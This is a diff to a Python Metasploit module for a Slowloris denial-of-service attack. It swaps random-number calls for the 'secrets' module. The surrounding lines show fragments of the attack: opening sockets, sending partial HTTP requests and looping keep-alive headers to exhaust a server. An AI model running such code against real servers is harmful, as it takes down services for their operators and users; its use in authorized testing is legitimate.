@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 
-import random
 import socket
 import ssl
 import string
 import time
 
 from metasploit import module
+import secrets
 
 metadata = {
     'name': 'Slowloris Denial of Service Attack',
@@ -71,7 +71,7 @@ user_agents = [
 
 
 def create_random_header_name(size=8, seq=string.ascii_uppercase + string.ascii_lowercase):
-    return ''.join(random.choice(seq) for _ in range(size))
+    return ''.join(secrets.choice(seq) for _ in range(size))
 
 
 def init_socket(host, port, use_ssl=False, rand_user_agent=True):
@@ -81,10 +81,10 @@ def init_socket(host, port, use_ssl=False, rand_user_agent=True):
     if use_ssl:
         s = ssl.wrap_socket(s)
 
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+    s.send("GET /?{} HTTP/1.1\r\n".format(secrets.SystemRandom().randint(0, 2000)).encode("utf-8"))
 
     if rand_user_agent:
-        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
+        s.send("User-Agent: {}\r\n".format(secrets.choice(user_agents)).encode("utf-8"))
     else:
         s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
 
@@ -115,8 +115,8 @@ def run(args):
         module.log("Sending keep-alive headers... Socket count: %s" % len(list_of_sockets), 'info')
         for s in list(list_of_sockets):
             try:
-                s.send("{}: {}\r\n".format(create_random_header_name(random.randint(8, 16)),
-                                           random.randint(1, 5000)).encode("utf-8"))
+                s.send("{}: {}\r\n".format(create_random_header_name(secrets.SystemRandom().randint(8, 16)),
+                                           secrets.SystemRandom().randint(1, 5000)).encode("utf-8"))
 
             except socket.error:
                 list_of_sockets.remove(s)
